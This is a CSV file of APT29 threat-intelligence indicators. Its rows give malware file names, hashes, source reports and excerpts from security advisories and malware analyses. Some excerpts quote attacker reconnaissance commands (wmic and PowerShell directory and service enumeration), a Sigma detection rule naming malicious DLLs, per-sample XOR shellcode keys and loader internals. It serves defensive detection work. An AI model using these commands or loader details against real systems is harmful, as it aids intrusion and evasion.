1.0.0,actor--apt29,artifact--sha256:c39244b31f60d67a83d1e2fb8c5e1b1f498a0980c74e3821c7ae5709f1a23c95,observation--sha256:4d323f75b47fea38eb124bcdb8afdc467f71bca57bd8c23b0a12a18115ba5e0f,file-name,Files140runtime.dll7za.dllnovember_schedulexe.pdfphotos_and_price.exeschedule.zipvcruntime140.dll,Files140runtime.dll7za.dllnovember_schedulexe.pdfphotos_and_price.exeschedule.zipvcruntime140.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Appendix A   Indicators Domainstotalmassasje[.]no Files140runtime.dll7za.dllnovember_schedulexe.pdfphotos_and_price.exeschedule.zipvcruntime140.dll User AgentsMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53 SHA2561cffaf3be725d1514c87c328ca578d5df1a86ea3b488e9586f9db89d992da5c4381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62c6b0692103c844e902977b478eace8568f49dd9e5c91db8e534f3c5410ee663d0be",
1.0.0,actor--apt29,artifact--sha256:60dbda7cc7bfbb1685cc25a62e8a6204533eb2e8a0ddd2f4988cb8c24523d68a,observation--sha256:e8d8c7a7acabdb15dfd0bb89030636533beeac7a205df1bba9d42bae84884643,file-name,GetPasswords.pdb,GetPasswords.pdb,candidate,,unknown,unknown,not-stated,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 28 CozyDuke is not simply a malware toolset; rather, it is a modular malware platform formed around a core backdoor component. This component can be instructed by the C&C server to download and execute arbitrary modules, and it is these modules that provide CozyDuke with its vast array of functionality. Known CozyDuke modules include: • Command execution module for executing arbitrary Windows Command Prompt commands • Password stealer module • NT LAN Manager (",
1.0.0,actor--apt29,artifact--sha256:729b267aae13dd811d17c5799c2c1948341a69ccbfd27bf19104af138e3cfd33,observation--sha256:0fc8a55eeae2fa48f061171b164da191acb8973b2573ee51db0e4eb85c1557e7,file-name,GoogleCrashHandler64.exe,GoogleCrashHandler64.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:e0bdac33371fdb7c269a972eb81818da11b2601b40965c527f56193be0a69962,observation--sha256:098785a122e7e437589819dd2a8dc233682613be00a908719310f78ed8282c83,file-name,HandleFrequencyAll.dll,HandleFrequencyAll.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:7492803bdc6c82c1994513dfa63ed53fb5a914eb5aba1901e90daa620875e952,observation--sha256:c66c499a0f0015345ca55a878560af85f8a4eeaa663470805dc6b30bc678b6ce,file-name,HardSwapColor.dll,HardSwapColor.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:f3c705a8d22b46be144f2c6f8c40798cd9acedc4498946b3b2acfa2a8e36bc4d,observation--sha256:02ae27a15710e9bc81e31b771b345387f220241acfeb6cbee029c7b60ffe15f3,file-name,IAM Identity Center Access.rdp,IAM Identity Center Access.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 292}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,IAM Identity Center Access.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:0bdcf67433d408278e3ade52a50df4072410ddc840680529a32762f5c307f59f,observation--sha256:12efeea373772be52896315c7bc7ddd94faef420f7d09221c25a71efb859d62c,file-name,IAM Identity Center Application Access.rdp,IAM Identity Center Application Access.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 293}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,IAM Identity Center Application Access.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:73a6645e66c57d67a89490be24517b6c0f6de7a439f34892ce0e7b59ef29e4de,observation--sha256:4a2d51616281374526cd815b5dfe0bf16b3204126a640352c98bcb52968b66eb,file-name,Implant1.exe,Implant1.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5211 Table 1. List of implants NAME ACCESS11 Implant1.exe Private Implant2.exe Private Implant3.exe Private Implant4.exe Private Implant5.exe Private Implant6.exe Private Implant7.exe Private Implant8.exe Private Implant9.exe Private Implant10.exe Private 1 Private means that the sample has not been found in VirusTotal or other public sources consulted. The first evidence of APT29 dates to 2008, during the Second Chechen War, with a very notable compromise attributed to them in 2015",
1.0.0,actor--apt29,artifact--sha256:73a6645e66c57d67a89490be24517b6c0f6de7a439f34892ce0e7b59ef29e4de,observation--sha256:502de9e98a339087f5bcf2031226175bd1d3541e49cf65dc443d75e03e630c47,file-name,Implant1.exe,Implant1.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:73a6645e66c57d67a89490be24517b6c0f6de7a439f34892ce0e7b59ef29e4de,observation--sha256:7247e5e6249b20805ea75944ca081cc84a9a17835108cb00f5953308d43095cd,file-name,Implant1.exe,Implant1.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5215 NAME SIZE ENTROPY F . COMPILATION TOOL Implant1.exe 1,43 MB 7, 109 02/05/2008 Visual Studio 2012 11.0 Implant2.exe 1,35 MB 7,086 25/06/2007 Visual Studio 2005 8.0 Implant3.exe 1,28 MB 7, 123 23/01/2009 Visual Studio 2008 9.0 Implant4.exe 1,59 MB 7,091 20/01/2004 Visual Studio 2010 10. 10 Implant5.exe 1,52 MB 7, 132 28/07/2001 Visual Studio 2008 9.0 Implant6.exe 1,37 MB 7,042 10/02/2015 Visual Studio 2010 10. 10 Implant7.exe 1,39 MB 7,067 08/06/2005 Visual Studio 2015 14.0 Impla",
1.0.0,actor--apt29,artifact--sha256:73a6645e66c57d67a89490be24517b6c0f6de7a439f34892ce0e7b59ef29e4de,observation--sha256:9206793770e63cb8170fe924b91b004201f94cb123bd7aa83d77904cd6f2d8f3,file-name,Implant1.exe,Implant1.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Easter Bunny Artifact analysis3 This section provides a detailed analysis of each of the artifacts from the campaign. However, given that they are quite similar and belong to the same family, the Implant1.exe binary has been used as the basis for the analysis, indicating any differences with any of the other binaries. The artifacts are constructed in a Matryoshka manner, that is, through different links where each phase is responsible for preparing the next.",
1.0.0,actor--apt29,artifact--sha256:73a6645e66c57d67a89490be24517b6c0f6de7a439f34892ce0e7b59ef29e4de,observation--sha256:f47ab88df2eabeb6ec572c18cb26aecaad4c1f1a356627a3826a6987f8860931,file-name,Implant1.exe,Implant1.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"26Easter Bunny MEMOVE SHELLCODE Illustration 13. Fully deobfuscated block In the case of Implant1.exe, we have 483 blocks ranging in size from 260 to 2041 bytes. Furthermore, the blocks are not in order in the “.text” section, so they will have to be reorganized in the heap. All this block sorting information is found in an index table in the “.data” section. This index indicates the offset of each block in the .text and in the heap, so that the malware can reorder all the blocks in their corres",
1.0.0,actor--apt29,artifact--sha256:73a6645e66c57d67a89490be24517b6c0f6de7a439f34892ce0e7b59ef29e4de,observation--sha256:65d8999ddad754e28929f6ce6441406ede86faab8791a1f5a80dc41aef411203,file-name,Implant1.exe,Implant1.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5229 DECODE SHELLCODE Once the above algorithm has been executed, the “DECODE SHELLCODE” function begins to decrypt the code content using the generated key. The following table shows the different XOR keys for each of the samples. As we can see, this key can vary in size. Table 4. XOR keys for each sample NAME XOR KEY Implant1.exe 6F 19 5B DB C2 50 43 3C 1D 12 42 44 F4 A9 B3 EF 7B 65 D4 C7 0A 13 E6 D8 58 BC F7 96 D7 D7 4D 1B 6E 2D 8E E4 CA 7E 3C C4 6A 2D 8E E4 CA 7E Implant2.exe 08",
1.0.0,actor--apt29,artifact--sha256:73a6645e66c57d67a89490be24517b6c0f6de7a439f34892ce0e7b59ef29e4de,observation--sha256:25636bb9b1393c0a5e904691454bf64d9eaecd38ae5b0bf3edcff706ff2aa964,file-name,Implant1.exe,Implant1.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 39}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,38Easter Bunny 3.2. 1 Header The header of code block #1 contains a series of well-defined fields that are necessary for its correct execution and that of the second code block #2 that it embeds. ENTRY POINT (EP) SHIFTS & FUNCTIONS The highlighted fields indicate offsets in the code block to access important points in the loader. a. b. + 0x08 – Offset to the function table (0x39) Illustration 26. Header “Code block #1” of Implant1.exe (1) + 0x00 – Offset to the EntryPoint within the “1st Shellco,
1.0.0,actor--apt29,artifact--sha256:73a6645e66c57d67a89490be24517b6c0f6de7a439f34892ce0e7b59ef29e4de,observation--sha256:7742ab3c25554dfcf7438b357147de5f3b09010e75581a9cfbf28c89d6448118,file-name,Implant1.exe,Implant1.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40Easter Bunny CODE BLOCK INFORMATION The last fields show a series of information about the second embedded code block that will be loaded later. In order, it would be: a. Size (+ 0x24): ): 3 bytes to indicate the size of the second code block. (0x4ACAC) b. Compressed (+ 0x28): 1 Boolean indicating whether the second code block is compressed (1 if yes, 0 if no). (0x00) c. Hash (+ 0x29): 16 bytes to indicate the MD5 hash of the second code block (already decrypted). (0xDB5F367A73197B6A603C3006FF",
1.0.0,actor--apt29,artifact--sha256:73a6645e66c57d67a89490be24517b6c0f6de7a439f34892ce0e7b59ef29e4de,observation--sha256:4d4807a0b5109db5d07d8a2e1345414e1d9391972f7d090824e2dd3fda9bbd59,file-name,Implant1.exe,Implant1.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 57}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"56Easter Bunny EP OFFSET & HEADER SIZE + 0x10: Size of the second code block (0x0C04) + 0x08: Offset to EntryPoint (0x07F0) Figure 44. Header of the second code block Implant1.exe (2) As in the previous code block, these offsets point to the functions that will be used by the second code block. The 11 functions in the function table are shown below: Table 8. Functions of the second code block OFFSET NAME + 0x14 MEMCOPY_SHC + 0x1C FILL_ZERO + 0x24 ALLOC_MEM + 0x2C CALL_MEMCOPY + 0x34 GET_LIBRARIE",
1.0.0,actor--apt29,artifact--sha256:73a6645e66c57d67a89490be24517b6c0f6de7a439f34892ce0e7b59ef29e4de,observation--sha256:45857505d63a2b6481e7c401b5d0d15c74739e406877cdf603555150efb15388,file-name,Implant1.exe,Implant1.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 60}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5259 3.3.2.3 Loading the final payload (ALLOC_MEM) The first ALLOC_MEM function reserves a memory page where the final payload will be loaded. The header of the “Final Payload” contains important information for this section, such as: + 0x00: Byte indicating where to reserve memory (0x22) + 0x08: Address where to reserve the memory. (0x0140000000) + 0x10: Size to reserve. (0x4B000) Illustration 47 . Header of the final payload Implant1.exe (1) code block #2",
1.0.0,actor--apt29,artifact--sha256:73a6645e66c57d67a89490be24517b6c0f6de7a439f34892ce0e7b59ef29e4de,observation--sha256:c2822b329405e5c775389a12ad6380ee7371301b0ab44025cd4c0022b3c0feb6,file-name,Implant1.exe,Implant1.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 63}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"62Easter Bunny Next, the sample goes through a series of functions that will only be executed if a series of values exist in the header: GET_LIBRARIES and GET_FUNCTIONS. Illustration 51. Malfind result from memory + 0x24: If its value is not 0, the GET_LIBRARIES function will be executed. + 0x1C: If its value is not 0, the GET_FUNCTIONS function will be executed Illustration 52. Header of the final payload Implant1.exe (2) None of our samples execute these functions, but analyzing their code, it",
1.0.0,actor--apt29,artifact--sha256:73a6645e66c57d67a89490be24517b6c0f6de7a439f34892ce0e7b59ef29e4de,observation--sha256:190cdabbd9f611500b273c9430535729fd261ed407da8dbc5600399de7afb016,file-name,Implant1.exe,Implant1.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 64}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5263 3.3.2.4 Create pointers to functions and data (GET_FUN_PTRS) Next, the sample enters the GET_FUN_PTRS function, which will be responsible for creating a table of pointers for the internal functions of the final payload. To do this, it will access the data in the address offsets section mentioned above. Figure 53. Header of the final payload Implant1.exe (3) + 0x45: Offset to address offsets. (0x4A0) + 0x48: Size of the address offsets section. (0x110) The address offsets sectio",
1.0.0,actor--apt29,artifact--sha256:be39aa0b430112f8feac7e5fc5ee515d8e8617c6d4d9709fe9bbd291e65ac65f,observation--sha256:0da28b8d39b0212864826b04165afcb48a31cbb8cfff3ffb108aa6c63351c1e4,file-name,Implant10.exe,Implant10.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5211 Table 1. List of implants NAME ACCESS11 Implant1.exe Private Implant2.exe Private Implant3.exe Private Implant4.exe Private Implant5.exe Private Implant6.exe Private Implant7.exe Private Implant8.exe Private Implant9.exe Private Implant10.exe Private 1 Private means that the sample has not been found in VirusTotal or other public sources consulted. The first evidence of APT29 dates to 2008, during the Second Chechen War, with a very notable compromise attributed to them in 2015",
1.0.0,actor--apt29,artifact--sha256:be39aa0b430112f8feac7e5fc5ee515d8e8617c6d4d9709fe9bbd291e65ac65f,observation--sha256:feac2e10265580b7b72652d08d07c4e36f0d33ece389fa8caa1dda0b80fd48ff,file-name,Implant10.exe,Implant10.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:be39aa0b430112f8feac7e5fc5ee515d8e8617c6d4d9709fe9bbd291e65ac65f,observation--sha256:947f1e6bb6c6a799d4337b459b8e63f546ec49a05d12c6d1610cafcc9a07a23d,file-name,Implant10.exe,Implant10.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5215 NAME SIZE ENTROPY F . COMPILATION TOOL Implant1.exe 1,43 MB 7, 109 02/05/2008 Visual Studio 2012 11.0 Implant2.exe 1,35 MB 7,086 25/06/2007 Visual Studio 2005 8.0 Implant3.exe 1,28 MB 7, 123 23/01/2009 Visual Studio 2008 9.0 Implant4.exe 1,59 MB 7,091 20/01/2004 Visual Studio 2010 10. 10 Implant5.exe 1,52 MB 7, 132 28/07/2001 Visual Studio 2008 9.0 Implant6.exe 1,37 MB 7,042 10/02/2015 Visual Studio 2010 10. 10 Implant7.exe 1,39 MB 7,067 08/06/2005 Visual Studio 2015 14.0 Impla",
1.0.0,actor--apt29,artifact--sha256:be39aa0b430112f8feac7e5fc5ee515d8e8617c6d4d9709fe9bbd291e65ac65f,observation--sha256:9ed6152981d7be4ab05bbf15767b59e121c30cc0a44b382d1607484f15b1015d,file-name,Implant10.exe,Implant10.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5229 DECODE SHELLCODE Once the above algorithm has been executed, the “DECODE SHELLCODE” function begins to decrypt the code content using the generated key. The following table shows the different XOR keys for each of the samples. As we can see, this key can vary in size. Table 4. XOR keys for each sample NAME XOR KEY Implant1.exe 6F 19 5B DB C2 50 43 3C 1D 12 42 44 F4 A9 B3 EF 7B 65 D4 C7 0A 13 E6 D8 58 BC F7 96 D7 D7 4D 1B 6E 2D 8E E4 CA 7E 3C C4 6A 2D 8E E4 CA 7E Implant2.exe 08",
1.0.0,actor--apt29,artifact--sha256:f3dd1963dd3dc2edd5b8b23df9ae7524bf3dadc0722b948e4dc9d348db2b1b79,observation--sha256:c55ab5fc186cdb9a4e8b60753304c8f1dec2d7e3e9e228aa6291952a35d90800,file-name,Implant2.exe,Implant2.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5211 Table 1. List of implants NAME ACCESS11 Implant1.exe Private Implant2.exe Private Implant3.exe Private Implant4.exe Private Implant5.exe Private Implant6.exe Private Implant7.exe Private Implant8.exe Private Implant9.exe Private Implant10.exe Private 1 Private means that the sample has not been found in VirusTotal or other public sources consulted. The first evidence of APT29 dates to 2008, during the Second Chechen War, with a very notable compromise attributed to them in 2015",
1.0.0,actor--apt29,artifact--sha256:f3dd1963dd3dc2edd5b8b23df9ae7524bf3dadc0722b948e4dc9d348db2b1b79,observation--sha256:1abaf76130a563ec99ae3bb570e48c70b2acf48c96c478270c89c8b3843c1c4b,file-name,Implant2.exe,Implant2.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:f3dd1963dd3dc2edd5b8b23df9ae7524bf3dadc0722b948e4dc9d348db2b1b79,observation--sha256:54f0c735738eb85ecdcf2b5bcad598994441e0fbdadea2890cd0f25ecadeede7,file-name,Implant2.exe,Implant2.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5215 NAME SIZE ENTROPY F . COMPILATION TOOL Implant1.exe 1,43 MB 7, 109 02/05/2008 Visual Studio 2012 11.0 Implant2.exe 1,35 MB 7,086 25/06/2007 Visual Studio 2005 8.0 Implant3.exe 1,28 MB 7, 123 23/01/2009 Visual Studio 2008 9.0 Implant4.exe 1,59 MB 7,091 20/01/2004 Visual Studio 2010 10. 10 Implant5.exe 1,52 MB 7, 132 28/07/2001 Visual Studio 2008 9.0 Implant6.exe 1,37 MB 7,042 10/02/2015 Visual Studio 2010 10. 10 Implant7.exe 1,39 MB 7,067 08/06/2005 Visual Studio 2015 14.0 Impla",
1.0.0,actor--apt29,artifact--sha256:f3dd1963dd3dc2edd5b8b23df9ae7524bf3dadc0722b948e4dc9d348db2b1b79,observation--sha256:f888f618407bb88644899bc80fdd1effbe6fc84fd152a8f45bf7dda308d7376a,file-name,Implant2.exe,Implant2.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5229 DECODE SHELLCODE Once the above algorithm has been executed, the “DECODE SHELLCODE” function begins to decrypt the code content using the generated key. The following table shows the different XOR keys for each of the samples. As we can see, this key can vary in size. Table 4. XOR keys for each sample NAME XOR KEY Implant1.exe 6F 19 5B DB C2 50 43 3C 1D 12 42 44 F4 A9 B3 EF 7B 65 D4 C7 0A 13 E6 D8 58 BC F7 96 D7 D7 4D 1B 6E 2D 8E E4 CA 7E 3C C4 6A 2D 8E E4 CA 7E Implant2.exe 08",
1.0.0,actor--apt29,artifact--sha256:0e5853a9deb36a5cff02757f4a2a1290b98294e04d17d73b8a6c49ef0362c87e,observation--sha256:356ce2bc8b5b7bf218ecb2e467d499fb5fb2dad2e53b553e3d11d2eefdfcef20,file-name,Implant3.exe,Implant3.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5211 Table 1. List of implants NAME ACCESS11 Implant1.exe Private Implant2.exe Private Implant3.exe Private Implant4.exe Private Implant5.exe Private Implant6.exe Private Implant7.exe Private Implant8.exe Private Implant9.exe Private Implant10.exe Private 1 Private means that the sample has not been found in VirusTotal or other public sources consulted. The first evidence of APT29 dates to 2008, during the Second Chechen War, with a very notable compromise attributed to them in 2015",
1.0.0,actor--apt29,artifact--sha256:0e5853a9deb36a5cff02757f4a2a1290b98294e04d17d73b8a6c49ef0362c87e,observation--sha256:ca18b8701dcc5ffc16df96eb83159345408163130a03ffaa2617461e2de390cf,file-name,Implant3.exe,Implant3.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5215 NAME SIZE ENTROPY F . COMPILATION TOOL Implant1.exe 1,43 MB 7, 109 02/05/2008 Visual Studio 2012 11.0 Implant2.exe 1,35 MB 7,086 25/06/2007 Visual Studio 2005 8.0 Implant3.exe 1,28 MB 7, 123 23/01/2009 Visual Studio 2008 9.0 Implant4.exe 1,59 MB 7,091 20/01/2004 Visual Studio 2010 10. 10 Implant5.exe 1,52 MB 7, 132 28/07/2001 Visual Studio 2008 9.0 Implant6.exe 1,37 MB 7,042 10/02/2015 Visual Studio 2010 10. 10 Implant7.exe 1,39 MB 7,067 08/06/2005 Visual Studio 2015 14.0 Impla",
1.0.0,actor--apt29,artifact--sha256:0e5853a9deb36a5cff02757f4a2a1290b98294e04d17d73b8a6c49ef0362c87e,observation--sha256:951984cc4cabac4418399fd1fc8be7b7fb8da80493a44741bece9ae5b800abe4,file-name,Implant3.exe,Implant3.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5229 DECODE SHELLCODE Once the above algorithm has been executed, the “DECODE SHELLCODE” function begins to decrypt the code content using the generated key. The following table shows the different XOR keys for each of the samples. As we can see, this key can vary in size. Table 4. XOR keys for each sample NAME XOR KEY Implant1.exe 6F 19 5B DB C2 50 43 3C 1D 12 42 44 F4 A9 B3 EF 7B 65 D4 C7 0A 13 E6 D8 58 BC F7 96 D7 D7 4D 1B 6E 2D 8E E4 CA 7E 3C C4 6A 2D 8E E4 CA 7E Implant2.exe 08",
